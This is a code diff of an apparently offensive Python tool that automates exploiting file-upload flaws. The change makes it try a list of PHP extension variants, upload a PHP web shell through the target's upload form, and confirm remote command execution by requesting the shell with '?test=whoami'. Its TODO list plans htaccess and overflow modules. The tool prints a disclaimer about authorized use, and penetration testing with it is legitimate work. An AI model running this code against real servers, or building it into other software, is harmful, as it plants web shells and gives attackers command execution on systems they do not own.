@@ -21,8 +21,11 @@ from argparse import RawTextHelpFormatter
 #   Parse shell upload dir from response for dynamic names
 #   Add custom injection markers
 #   Add different php types
-#   Correct progress bar display
 #   Add more file types (pdf...)
+#   Catch timeouts
+#   Overflow module
+#   htaccess module
+#   Limit module iterations if over
 
 # Set of colors
 red = '\u001b[31;1m'
@@ -114,7 +117,7 @@ def banner():
     print("██║     ██║███████╗███████╗██║     ╚███╔███╔╝██║ ╚████║███████╗██║  ██║")
     print("╚═╝     ╚═╝╚══════╝╚══════╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝")
     print()
-    print("v1.0")
+    print("v1.1")
     print()
     info("Disclaimer: The use of this tool and techniques should only be performed with proper authorization and consent from the targeted systems or networks. Unauthorized use can lead to legal consequences. It is the responsibility of the user to ensure that the tool is used for its intended purpose and not for any malicious or illegal activities.")
     print()     
@@ -201,9 +204,7 @@ def parse_request_file(request_file):
 
     return content, headers, host, path
 
-def test_accepted_formats(request_file, session):
-    extensions_array = variations.extensions["normal"]
-    extensions_array.append("php")
+def test_accepted_formats(request_file, session, extensions_array):
     accepted_extensions = list()
     for extension in extensions_array:
         with open(f"assets/sample_files/sample.{extension}", 'rb') as file: file_data = file.read()
@@ -540,22 +541,30 @@ def main():
     content, headers, host, path = parse_request_file(options.request_file)
     upload_url = f"http://{host}{options.upload_dir}"
 
-    accepted_extensions = test_accepted_formats(options.request_file, session)
+    accepted_extensions = test_accepted_formats(options.request_file, session, variations.extensions["normal"])
     debug(accepted_extensions, 3)
-    if (len(accepted_extensions) < 1):
+
+    accepted_php_extensions = test_accepted_formats(options.request_file, session, variations.extensions["php"])
+    debug(accepted_extensions, 3)
+
+    if (len(accepted_extensions) < 1 and len(accepted_php_extensions) < 1):
         error("No accepted extensions found")
-    if ("php" in accepted_extensions):
-        info("Trying to upload .php shell...")
-        with open("assets/shells/simple.php", 'rb') as file: file_data = file.read()
-        response, session, headers, url, file_name = upload(options.request_file, session, file_data, ".php", "application/x-httpd-php")
-        if (check_success(response)):
-            success("Shell successfully uploaded")
-            if (check_shell(upload_url + file_name) == True):
-                success("Shell confirmed interractable")
-                exit_success(upload_url + file_name)
-            else:
-                debug((upload_url + file_name + "?test=whoami"), 1)
-                error("Shell does not seem to be interractable, make sure your upload directory is correct")
+
+    if (len(accepted_php_extensions) > 0):
+        for accepted_php_extension in accepted_php_extensions:
+            info(f"Trying to upload .{accepted_php_extension} shell...")
+            with open("assets/shells/simple.php", 'rb') as file: file_data = file.read()
+            response, session, headers, url, file_name = upload(options.request_file, session, file_data, f".{accepted_php_extension}", "application/x-httpd-php")
+            if (check_success(response)):
+                success("Shell successfully uploaded")
+                if (check_shell(upload_url + file_name) == True):
+                    success("Shell confirmed interractable")
+                    exit_success(upload_url + file_name)
+                else:
+                    debug((upload_url + file_name + "?test=whoami"), 1)
+                    warning("Shell does not seem to be interractable, make sure your upload directory is correct")
+        
+        exit(1)
             
 
 
